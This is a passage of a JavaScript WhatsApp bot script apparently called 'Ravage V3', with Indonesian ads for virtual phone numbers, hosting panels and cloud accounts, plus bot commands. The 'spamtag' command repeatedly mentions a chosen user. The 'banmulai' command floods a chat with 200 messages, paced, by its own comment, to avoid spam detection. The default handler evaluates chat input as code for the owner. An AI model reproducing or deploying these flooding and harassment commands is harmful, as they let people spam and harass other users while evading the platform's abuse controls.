                title: `『 \`𝗡𝗢𝗞𝗢𝗦 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣\` 』
*NOKOS INDO VERIFIKASI ULANG :15K*
*NOKOS INDO NO VERIFIKASI ULANG : 5K*
*NOKOS ALL NEGARA/LUAR NEGERI*
`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: thumb }, { upload: dafa.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ʙᴇʟɪ sᴇᴋᴀʀᴀɴɢ🛒\",\"url\":\"https://wa.me/6282321593192\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
  {
  "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴛᴇsᴛɪᴍᴏɴɪ\",\"url\":\"https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `『 \`𝗣𝗔𝗡𝗘𝗟 𝗣𝗧𝗘𝗥𝗢𝗗𝗔𝗖𝗧𝗟𝗬\`』
━━━━━━━━━━━━━━━━━━━━━━
> 📦 1GB CPU 30% : 1K / BULAN
> 📦 2GB CPU 60% : 2K / BULAN
> 📦 3GB CPU 80% : 3K / BULAN
> 📦 4GB CPU 100% 4K / BULAN
> 📦 5GB CPU 120% : 5K / BULAN
> 📦 6GB CPU 140% : 6k / BULAN
> 📦 7GB CPU 160% : 7K / BULAN
> 📦 8GB CPU 200% 8k / BULAN
> 📦 9GB CPU 230% 9k / BULAN
> 📦 10GB CPU 250% 10k / BULAN
> 📦 UNLI CPU UNLI% 12K / BULAN
━━━━━━━━━━━━━━━━━━━━━━
_*KEUNTUNGAN :*_
> 📦 _*ON 24JAM ATAU LEBIH*_ 
> 📦 _*WEB / APK BISA DI CLOSE*_
> 📦 _*BOT ANTI DELAY*_
> 📦 _*TIDAK BOROS KOUTA*_
━━━━━━━━━━━━━━━━━━━━━━
> 1 BULAN = 8K PROMO 5K
> 3 BULAN = 14K PROMO 10K
> 8 BULAN = 28K PROMO 20K
> PERMANEN = 36K PROMO 25K
`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: thumb }, { upload: dafa.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ʙᴇʟɪ sᴇᴋᴀʀᴀɴɢ🛒\",\"url\":\"https://wa.me/6282321593192\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
  {
  "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴛᴇsᴛɪᴍᴏɴɪ\",\"url\":\"https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `『 \`𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗚𝗜𝗧𝗔𝗟 𝗢𝗖𝗘𝗔𝗡\`』
                10 DROLETS PAYPAL 1 Tahun
                `,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: thumb }, { upload: dafa.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ʙᴇʟɪ sᴇᴋᴀʀᴀɴɢ🛒\",\"url\":\"https://wa.me/6282321593192\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
  {
  "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴛᴇsᴛɪᴍᴏɴɪ\",\"url\":\"https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `『 \`𝗝𝗔𝗦𝗔 𝗣𝗘𝗠𝗕𝗨𝗔𝗧𝗔𝗡 𝗪𝗘𝗕𝗦𝗜𝗧𝗘\`』
- Store
- Top up
- Sosmed
- AI 
- Pulsa
- Shop Baju
- Sekolah
*Dan lain-lain*

*Keuntungan*
- Serba Otomatis
- Sudah mendapatkan pembayaran otomatis
- Sudah Mendapatkan Free update
- Sudah Mendapatkan Upload Hosting
- Bebas Request nama domain
- 
*HARGA MULAI DARI*
15K-50K
> Note :
Harga sesuai request
                `,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: thumb }, { upload: dafa.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ʙᴇʟɪ sᴇᴋᴀʀᴀɴɢ🛒\",\"url\":\"https://wa.me/6282321593192\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
  {
  "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴛᴇsᴛɪᴍᴏɴɪ\",\"url\":\"https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
                  ]
              })
            }
                ]
              })
        })
      }
      }
      }, {})

await dafa.relayMessage(from, msg.message, {
  messageId: msg.key.id
})
break

case 'spamtag': {
    if (!m.mentionedJid[0]) {
        return reply('𝗧𝗮𝗴 𝗼𝗿𝗮𝗻𝗴𝗻𝘆𝗮!!!\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .𝘀𝗽𝗮𝗺𝘁𝗮𝗴 @𝗱𝗮𝗳𝗳𝗮𝗴𝗮𝗻𝘁𝗲𝗻𝗴𝗯𝗮𝗻𝗴𝗲𝘁 | 𝟭𝟬');
    }

    const [orang, amountStr] = text.split("|").map(item => item.trim());
    const amount = parseInt(amountStr, 10);

    if (isNaN(amount) || amount <= 0) {
        return reply('𝗝𝘂𝗺𝗹𝗮𝗵 𝗵𝗮𝗿𝘂𝘀 𝗯𝗲𝗿𝘂𝗽𝗮 𝗮𝗻𝗴𝗸𝗮 𝗽𝗼𝘀𝗶𝘁𝗶𝗳!');
    }

    for (let i = 0; i < amount; i++) {
        dafa.sendMessage(m.chat, {
            text: orang,
            mentions: [m.mentionedJid[0]]
        });
       await sleep(500) 
    }
}
break

case "banscravage": {
let msgbug = `*\`[Keamanan Terdeteksi!!!]\`*\nAda yang telah menggunakan script ravage KW/CRACK!!!`
let buttons = [
        { buttonId: ".banmulai", buttonText: { displayText: "ＭＯＤＡＬ ＤＩＫＩＴ ＤＥＫ" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎"
            }
        },
        footer: "© Ravage V3",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await dafa.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break

case 'banmulai': {
    const pesan = "*[Security Detectable!!!]*\nɴɢᴀᴘᴀɪɴ ᴘᴀᴋᴇ sᴄ ᴄʀᴀᴄᴋ ᴅᴇᴋ";
    const amount = 200;

    for (let i = 0; i < amount; i++) {
        await dafa.sendMessage(m.chat, { text: pesan }, { quoted: ftoko });
        await sleep(500); // Jeda 0.5 detik agar tidak terdeteksi spam
    }

    reply("/bannscravage");
}
break;

case 'stopban': {
    return reply("Spam dihentikan! (Jika sedang berjalan, mungkin masih ada beberapa pesan yang terkirim)");
}
break;

case 'pinterest': case 'pin': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} Tobrut`);
async function sendAlbumMessage(jid, medias, options) {
  options = { ...options };

  const caption = options.text || options.caption || "";

  const album = baileys.generateWAMessageFromContent(jid, {
    albumMessage: {
      expectedImageCount: medias.filter(media => media.type === "image").length,
      expectedVideoCount: medias.filter(media => media.type === "video").length,
      ...(options.quoted ? {
        contextInfo: {
          remoteJid: options.quoted.key.remoteJid,
          fromMe: options.quoted.key.fromMe,
          stanzaId: options.quoted.key.id,
          participant: options.quoted.key.participant || options.quoted.key.remoteJid,
          quotedMessage: options.quoted.message
        }
      } : {})
    }
  }, { quoted: m});

  await dafa.relayMessage(album.key.remoteJid, album.message, {
    messageId: album.key.id
  });

  for (const media of medias) {
    const { type, data } = media;
    const img = await baileys.generateWAMessage(album.key.remoteJid, {
      [type]: data,
      ...(media === medias[0] ? { caption } : {})
    }, {
      upload: dafa.waUploadToServer
    });
    img.message.messageContextInfo = {
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };
    await dafa.relayMessage(img.key.remoteJid, img.message, {
      messageId: img.key.id
    });
  }

  return album;
}
    const blockedWords = /(judi|judol sialan)/i; //bagian filter teks, atur aja sendiri
    if (blockedWords.test(text)) {
        return reply('Tidak bisa melanjutkan pencarian');
    }
    await reply('Done mek');
    function shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    }
    try {
        let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let res = data.resource_response.data.results.map(v => v.images.orig.url);

        shuffleArray(res);
        let ult = res.slice(0, 4);

        if (ult.length === 0) return DaffaReply('Gambar tidak ditemukan.');

        if (!m.isGroup) {
            let mediaArray = ult.map(url => ({ type: "image", data: { url } }));
            await sendAlbumMessage(m.chat, mediaArray, { caption: `Hasil pencarian: ${text}` });
        } else {
            let push = [];
            let i = 1;

            async function createImage(url) {
                const { imageMessage } = await generateWAMessageContent({ image: { thumb } }, { upload: dafa.waUploadToServer });
                return imageMessage;
            }

            for (let lucuy of ult) {
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Image ke - ${i++}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({
                        text: "Daffa Dev"
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: 'Hasil.',
                        hasMediaAttachment: true,
                        imageMessage: await createImage(lucuy)
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"My Owner","url":"${global.owner}","merchant_url":"${global.owner}"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
                            }
                        ]
                    })
                });
            }

            const bot = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Done'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: global.botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: [...push]
                            })
                        })
                    }
                }
            }, { quoted: m });
            await dafa.relayMessage(m.chat, bot.message, { messageId: bot.key.id });
        }

    } catch (err) {
        console.error(err);
        reply('𝗘𝗿𝗿𝗼𝗿 𝗯𝗮𝗻𝗴');
    }
}
break

case 'tourl': {    
    let q = m.quoted ? m.quoted : PayX;
    if (!q || !q.download) return DaffaReply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('../DaffaGantenv/Data6');
    const uploadFile = require('../DaffaGanteng/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    dafa.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: PayX });
}
break

case 'antitagsw': {
 if (!m.isGroup) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!(isAdmins || isOwner)) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (args[0] === "on") {
       //WM: KHAERUL, jangan hapus wm dong biar kaya orang lain
 antiTagSWGroup[m.chat] = true
       //WM: KHAERUL, jangan hapus wm dong biar kaya orang lain😭  
    saveAntiTagSW(antiTagSWGroup)
        reply("𝗙𝗶𝘁𝘂𝗿 𝗮𝗻𝘁𝗶 𝘁𝗮𝗴 𝘀𝘁𝗮𝘁𝘂𝘀 𝗴𝗿𝘂𝗽 𝗮𝗸𝘁𝗶𝗳 𝗱𝗶 𝗴𝗿𝘂𝗽 𝗶𝗻𝗶!")
    } else if (args[0] === "off") {
        delete antiTagSWGroup[m.chat];
       //WM: KHAERUL, jangan hapus wm dong biar kaya orang lain😭
//My saluran: https://whatsapp.com/channel/0029VaWA5U1EQIamnmeXRn2M
 saveAntiTagSW(antiTagSWGroup);
      reply("𝗙𝗶𝘁𝘂𝗿 𝗮𝗻𝘁𝗶 𝘁𝗮𝗴 𝘀𝘁𝗮𝘁𝘂𝘀 𝗴𝗿𝘂𝗽 𝗱𝗶𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗱𝗶 𝗴𝗿𝘂𝗽 𝗶𝗻𝗶!")
    } else {
        reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix}𝗔𝗻𝘁𝗶𝘁𝗮𝗴𝘀𝘄 𝗢𝗻/𝗢𝗳𝗳`)
    }
   break;
}
                      
// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.replydaf(evaled);
} catch (err) {
m.replydaf(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (err) {
teks = e
} finally {
await m.replydaf(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});